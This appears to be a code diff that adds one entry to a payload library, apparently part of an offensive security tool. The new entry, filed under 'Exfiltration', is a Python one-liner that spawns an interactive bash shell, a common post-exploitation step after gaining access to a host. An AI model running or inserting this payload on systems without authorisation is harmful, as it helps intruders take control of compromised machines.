@@ -131,6 +131,13 @@ Load({
 	}
 })
 
+Load({
+	title: "Obtain a TTY via Python",
+	payload:'python -c \'import pty;pty.spawn("/bin/bash")\'',
+	category: "Exfiltration",
+})
+//
+
 /*
 ######################################################
 ############### End of Payloads ######################
